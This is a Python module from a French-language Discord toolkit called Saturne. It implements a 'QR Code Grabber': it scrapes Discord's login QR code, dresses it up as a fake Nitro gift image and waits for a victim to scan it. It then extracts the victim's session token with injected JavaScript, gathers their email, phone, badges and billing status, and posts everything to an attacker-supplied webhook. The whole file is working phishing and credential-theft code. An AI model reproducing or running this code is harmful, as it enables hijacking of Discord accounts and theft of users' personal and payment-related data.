###############################################################
# ███████╗ █████╗ ████████╗██╗   ██╗██████╗ ███╗   ██╗███████╗
# ██╔════╝██╔══██╗╚══██╔══╝██║   ██║██╔══██╗████╗  ██║██╔════╝
# ███████╗███████║   ██║   ██║   ██║██████╔╝██╔██╗ ██║█████╗  
# ╚════██║██╔══██║   ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══╝  
# ███████║██║  ██║   ██║   ╚██████╔╝██║  ██║██║ ╚████║███████╗
# ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝
###############################################################
# Crée par GalackQSM
# Github: https://github.com/GalackQSM/Saturne
# Discord: https://discord.gg/saturnetools|XvjJpw4D3m
# © 2022 Saturne
###############################################################

import requests
import os
import sys
import json
import base64
import Saturne

from PIL import Image
from zipfile import ZipFile
from time import sleep
from urllib.request import urlretrieve
from selenium import webdriver
from bs4 import BeautifulSoup
from colorama import Fore

from util.plugins.common import get_driver, getheaders

def logo_qr():
    im1 = Image.open('QR-Code/temp_qr_code.png', 'r')
    im2 = Image.open('QR-Code/overlay.png', 'r')
    im1.paste(im2, (60, 55), im2)
    im1.save('QR-Code/Qr_Code.png', quality=95)

def paste_template():
    im1 = Image.open('QR-Code/template.png', 'r')
    im2 = Image.open('QR-Code/Qr_Code.png', 'r')
    im1.paste(im2, (120, 409))
    im1.save('QR-Code/discord_gift.png', quality=95)

def QR_Grabber(Webhook):
    type_ = get_driver()

    if type_ == "chromedriver.exe":
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        driver = webdriver.Chrome(options=opts)
    # elif type_ == "operadriver.exe":
    #     opts = webdriver.opera.options.ChromeOptions()
    #     opts.add_experimental_option('excludeSwitches', ['enable-logging'])
    #     opts.add_experimental_option("detach", True)
    #     driver = webdriver.Opera(options=opts)
    elif type_ == "msedgedriver.exe":
        opts = webdriver.EdgeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        driver = webdriver.Edge(options=opts)
    else:
        print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Impossible de trouver un pilote pour créer un code QR')
        sleep(3)
        print("Entrez n'importe quoi pour continuer... ", end="")
        input()
        Saturne.main()

    driver.get('https://discord.com/login') 
    sleep(3)

    page_source = driver.page_source
    soup = BeautifulSoup(page_source, features='html.parser')

    div = soup.find('div', {'class': 'qrCode-2R7t9S'})
    qr_code = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'QR-Code/temp_qr_code.png')

    img_data = base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    print(f"\n{Fore.WHITE}Téléchargement de modèles pour le code QR")

    urlretrieve(
        "https://github.com/Rdimo/Injection/raw/master/QR-Code.zip",
        filename="QR-Code.zip",
    )
    with ZipFile("QR-Code.zip", 'r')as zip2:
        zip2.extractall()
    os.remove("QR-Code.zip")

    with open(file,'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    os.remove(os.getcwd()+"\\QR-Code\\overlay.png")
    os.remove(os.getcwd()+"\\QR-Code\\template.png")
    os.remove(os.getcwd()+"\\QR-Code\\temp_qr_code.png")

    print(f'\nQR Code généré en '+os.getcwd()+"\\QR-Code")
    print(f'\n{Fore.RED}Assurez-vous que cette fenêtre est ouverte pour récupérer leur token !{Fore.RESET}')
    print(f'{Fore.MAGENTA}Envoyez le code QR à un utilisateur et attendez qu\'il scanne!{Fore.RESET}')
    os.system(f'start {os.path.realpath(os.getcwd()+"/QR-Code")}')
    print(f'\nOuverture d\'un nouveau Saturne afin que vous puissiez continuer à l\'utiliser pendant que celui-ci enregistre le QR Code !\nN\'hésitez pas à réduire cette fenêtre{Fore.RESET}')
    if sys.argv[0].endswith(".exe"):
        try:
            os.startfile(sys.argv[0])
        except Exception:
            pass

    while True:
        if discord_login != driver.current_url:
            token = driver.execute_script('''
    token = (webpackChunkdiscord_app.push([
        [''],
        {},
        e=>{m=[];for(
                let c in e.c)
                m.push(e.c[c])}
        ]),m)
        .find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
    return token;
                ''')
            j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
            badges = ""
            flags = j['flags']
            if (flags == 1): badges += "Staff, "
            if (flags == 2): badges += "Partenaire, "
            if (flags == 4): badges += "Événement Hypesquad, "
            if (flags == 8): badges += "BugHunter vert, "
            if (flags == 64): badges += "Hypesquad Bravery, "
            if (flags == 128): badges += "HypeSquad Brillance, "
            if (flags == 256): badges += "HypeSquad Balance, "
            if (flags == 512): badges += "Early Supporter, "
            if (flags == 16384): badges += "BugHunter Or, "
            if (flags == 131072): badges += "Développeur de bots vérifié, "
            if (badges == ""): badges = "Aucun"

            user = j["username"] + "#" + str(j["discriminator"])
            email = j["email"]
            phone = j["phone"] if j["phone"] else "Aucun numéro"

            url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
            try:
                requests.get(url)
            except:
                url = url[:-4]
            nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token)).text)) > 0)

            embed = {
                "avatar_url":"https://i.imgur.com/5FntPbU.png",
                "embeds": [
                    {
                        "author": {
                            "name": "Saturne QR Code Grabber",
                            "url": "https://github.com/GalackQSM/Saturne",
                            "icon_url": "https://i.imgur.com/5FntPbU.png"
                        },
                        "description": f"**{user}** vient de scanner le code QR\n\n**Paiment:** `{billing}`\n**Nitro:** `{has_nitro}`\n**Badges:** `{badges}`\n**Email:** `{email}`\n**Téléphone:** `{phone}`\n**[Avatar]({url})**",
                        "fields": [
                            {
                              "name": "**Token**",
                              "value": f"```fix\n{token}```",
                              "inline": False
                            }
                        ],
                        "color": 8388736,

                        "footer": {
                          "text": "© GalackQSM https://github.com/GalackQSM/Saturne"
                        }
                    }
                ]
            }
            requests.post(Webhook, json=embed)
            break
    os._exit(0)